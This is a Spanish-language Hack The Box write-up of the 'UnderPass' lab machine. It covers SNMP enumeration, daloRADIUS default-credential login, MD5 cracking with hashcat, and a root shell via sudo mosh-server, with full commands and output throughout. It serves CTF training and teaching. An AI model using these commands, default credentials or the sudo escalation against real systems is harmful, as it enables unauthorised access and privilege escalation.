---
title: "UnderPass"
description: "Writeup de UnderPass - Hack The Box - Dificultad: Easy. SNMP revela daloRADIUS → credenciales por defecto → MD5 crackeado → SSH como svcMosh → sudo mosh-server para shell root."
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - snmp
  - daloradius
  - md5-crack
  - sudo-abuse
  - mosh-server
---

# 🐧 UnderPass

> 📅 Fecha: 2026-06-10
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 22.04.5 LTS)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo invertido: 3h 20m
> 🌐 IP: `10.129.231.213`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento TCP y UDP](#-reconocimiento-tcp-y-udp)
- [Enumeración SNMP → daloRADIUS](#-enumeración-snmp--daloradius)
- [Acceso daloRADIUS y extracción de hash](#-acceso-daloradius-y-extracción-de-hash)
- [SSH como svcMosh → user flag](#-ssh-como-svcmosh--user-flag)
- [Escalada: sudo mosh-server](#-escalada-sudo-mosh-server)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

UnderPass presenta un Apache en puerto 80 sin contenido útil, pero un escaneo UDP revela **SNMP (161/udp)**. La enumeración con comunidad `public` expone la descripción del sistema: `"UnDerPass.htb is the only daloradius server in the basin!"`. daloRADIUS es un frontend web para FreeRADIUS accesible con credenciales por defecto (`administrator:radius`). En la lista de usuarios del panel se encuentra `svcMosh` con un hash MD5 (`412DD4759978ACFCC81DEAB01B382403`) que se crackea en 1 segundo → `underwaterfriends`. SSH como `svcMosh`. La escalada es trivial: `sudo -l` muestra que puede ejecutar `/usr/bin/mosh-server` como root sin contraseña. `mosh-server new ... -- /bin/bash` lanza bash como root.

| Campo | Valor |
|-------|-------|
| Puntos débiles | SNMP con comunidad `public`, credenciales por defecto en daloRADIUS, MD5 sin salt, sudo irrestricto sobre mosh-server |
| Herramientas | `nmap`, `snmpwalk`, `curl`, `hashcat`, `ssh`, `mosh-client` |
| Tiempo total | ~3h 20m |

---

## 🔍 Reconocimiento TCP y UDP

**TCP:**

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.231.213
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    Apache httpd 2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Puerto 80 solo muestra la página por defecto de Apache. Sin nada útil en TCP inicial.

**UDP (clave para esta máquina):**

```bash
nmap -sU -p- -T4 --min-rate=1000 --open -Pn 10.129.231.213
```

```text
PORT    STATE SERVICE
161/udp open  snmp
```

---

## 📡 Enumeración SNMP → daloRADIUS

```bash
snmpwalk -c public -v2c 10.129.231.213
```

```text
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
```

La descripción del sistema (`sysDescr`) revela que corre **daloRADIUS**. La ruta por defecto del panel de operadores:

```bash
curl -si 'http://underpass.htb/daloradius/app/operators/login.php'
# HTTP/1.1 200 OK → panel activo
```

---

## 🔐 Acceso daloRADIUS y extracción de hash

Credenciales por defecto de daloRADIUS: `administrator:radius`

```bash
curl -X POST 'http://underpass.htb/daloradius/app/operators/dologin.php' \
  -d 'operator_user=administrator&operator_pass=radius&csrf_token=...'
# HTTP/1.1 302 → Location: index.php  → login exitoso
```

Lista de usuarios del panel:

```bash
curl "http://underpass.htb/daloradius/app/operators/mng-list-all.php" \
  -H "Cookie: daloradius_operator_sid=..." | grep "svcMosh"
```

```text
svcMosh  |  412DD4759978ACFCC81DEAB01B382403
```

Hash MD5 sin salt. Crackeo:

```bash
hashcat -m 0 -a 0 412DD4759978ACFCC81DEAB01B382403 /usr/share/wordlists/rockyou.txt
```

```text
412dd4759978acfcc81deab01b382403:underwaterfriends
Status: Cracked — Time: 1 sec
```

---

## 🖥️ SSH como svcMosh → user flag

```bash
ssh svcMosh@10.129.231.213
# password: underwaterfriends
```

```bash
svcMosh@underpass:~$ cat user.txt
[user flag]
```

---

## 🚀 Escalada: sudo mosh-server

```bash
svcMosh@underpass:~$ sudo -l
```

```text
User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

`mosh-server` acepta el parámetro `--` para especificar qué proceso lanzar. Como corre como `root` vía sudo, el proceso que pasamos es `bash`:

```bash
sudo /usr/bin/mosh-server new -c 256 -s -l LANG=en_US.UTF-8 -p 61000 -- /bin/bash
```

```text
MOSH CONNECT 61000 g338KZvdNlhC7mlumeX8sA
[mosh-server detached, pid = 2525]
```

Conectar con `mosh-client`:

```bash
MOSH_KEY=g338KZvdNlhC7mlumeX8sA mosh-client 10.129.231.213 61000
```

```text
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# cat root.txt
[root flag]
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. TCP scan → SSH (22) + Apache default (80) → nada obvio
        ↓
2. UDP scan → SNMP 161/udp con comunidad public
        ↓
3. snmpwalk → sysDescr revela "daloradius server"
        ↓
4. daloRADIUS en /daloradius/app/operators/login.php
        ↓
5. Credenciales por defecto administrator:radius → panel accesible
        ↓
6. Lista usuarios → svcMosh:412DD4759978ACFCC81DEAB01B382403 (MD5)
        ↓
7. hashcat -m 0 → underwaterfriends (1s)
        ↓
8. SSH svcMosh@host → user.txt
        ↓
9. sudo -l → /usr/bin/mosh-server NOPASSWD
        ↓
10. sudo mosh-server -- /bin/bash → root shell → root.txt
```

---

## 🎓 Lecciones Aprendidas

- **SNMP con comunidad `public`**: sigue siendo un vector subestimado. La descripción del sistema puede revelar servicios internos, usuarios de contacto, y configuraciones sensibles sin ninguna autenticación.
- **Credenciales por defecto en software interno**: daloRADIUS no es un servicio expuesto típicamente a internet, lo que lleva a que sus credenciales por defecto nunca se cambien.
- **MD5 sin salt en 2024**: almacenar contraseñas como MD5 plano es equivalente a texto claro en la práctica con hardware moderno. `hashcat` en modo `-m 0` opera a ~7 GH/s en GPU.
- **`sudo` sobre binarios que lanzan procesos arbitrarios**: `mosh-server` acepta `--` como separador para el proceso hijo. Cualquier binario que permita pasar comandos o subprocesos con sudo puede ser un GTFOBin en potencia.

---

## 📚 Referencias

- [GTFOBins — mosh-server](https://gtfobins.github.io/gtfobins/mosh-server/)
- [HackTricks — SNMP Enumeration](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
- [daloRADIUS Default Credentials](https://daloradius.com/docs/default-login)
